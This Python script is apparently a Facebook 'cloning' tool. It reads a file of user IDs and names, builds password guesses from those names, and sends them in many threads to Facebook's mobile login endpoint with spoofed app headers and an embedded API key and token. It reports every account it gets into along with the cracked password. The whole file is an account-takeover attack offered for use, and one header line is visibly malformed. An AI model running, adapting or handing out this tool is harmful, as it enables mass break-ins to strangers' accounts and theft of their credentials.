#WRITTEN BY OWEN FUEZO
#FOLLOW MY GITHUB : https://github.com/KLUEN-sketch/D4RK-0LM4R
#----------import----------#
import os
from time import sleep as slp
from concurrent.futures import ThreadPoolExecutor as ted
import uuid
import random 
import httpx
import json
import sys
#----------logo----------#
logo=('''                       
░█████╗░░██╗░░░░░░░██╗███████╗███╗░░██╗
██╔══██╗░██║░░██╗░░██║██╔════╝████╗░██║
██║░░██║░╚██╗████╗██╔╝█████╗░░██╔██╗██║
██║░░██║░░████╔═████║░██╔══╝░░██║╚████║
╚█████╔╝░░╚██╔╝░╚██╔╝░███████╗██║░╚███║
░╚════╝░░░░╚═╝░░░╚═╝░░╚══════╝╚═╝░░╚══╝ ''')
#----------clear----------#
def clear():
    os.system('clear')
    print(logo)
    print(42*'-')
    print(' FACEBOOK : OWEN FUEZO ')
    print(' GITHUB  : KLUEN-sketch')
    print(42*'-')
#----------line----------#
def line():
    print(42*'-')
#----------menu----------#
def main():
    clear()
    print(' [A] FILE CLONING ')
    print(' [E] EXIT ')
    line()
    option=input(' [??] CHOICE MENU : ')
    if option in ['a','A']:
        __file__()
    else:
        exit(' THANKS FOR USING ')
#----------file----------#
def __file__():
    clear()
    filex=input(' [??] ENTER FILE PATH : ')
    try:
        fo=open(filex,'r').read().splitlines()
    except FileNotFoundError:
        print(' File not found !!');slp(2)
        __file__()
    clear()
    try:
        pas_limit=int(input(' [??] ENTER PASSWORD LIMIT (1-30) : '))
    except:
        pas_limit=1
    line()
    pas_list=[]
    for i in range(pas_limit):
        pasx=input(f' [??] ENTER PASSWORD {i+1} : ')
        pas_list.append(pasx)
    with ted(max_workers=30) as Dipto:
        tl=str(len(fo))
        clear()
        print(' TOTAL ACCOUNT : '+tl)
        print(' USE AIRPLANE MODE FOR SPEED UP')
        line()
        for user in fo:
            ids,names=user.split('|')
            passlist=pas_list
            Dipto.submit(m1,ids,names,passlist)
    line()
    print(' THE PROCESS HAS BEEN COMPLETE')
    input(' PRESS ENTER TO BACK : ')
    main()
loop=0
oks=[]
cps=[]
#----------method------------#
def m1(ids,names,passlist):
    global oks,loop
    try:
        fn=names.split(' ')[0]
        try:
            ln=names.split(' ')[1]
        except:
            ln=fn
        for pw in passlist:
            sys.stdout.write('\r\r [RUNNING] %s|ALIVE:%s '%(loop,len(oks)));sys.stdout.flush()
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '882a8490361da98702bf97a021ddc14d', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head = {'User-Agent'FBAN/FB4A;FBAV/173.0.0.23.72;FBBV/260292751;FBRV/0;FBPN/com.facebook.katana;FBLC/ms_MY;FBMF/Vivo;FBBD/Vivo;FBDV/vivo y11;FBSV/5;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]67.0.5424.64,
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'X-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            url='https://b-graph.facebook.com/auth/login'
            req=httpx.post(url,data=data,headers=head).json()
            if 'session_key' in req:
                print('\r\r [ALIVE] '+ids+'|'+pas)
                oks.append(ids)
                break
            elif 'www.facebook.com' in req['error']['message']:
                print('\r\r [CHECKPOINT] '+ids+'|'+pas)
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#----------end----------#
main()
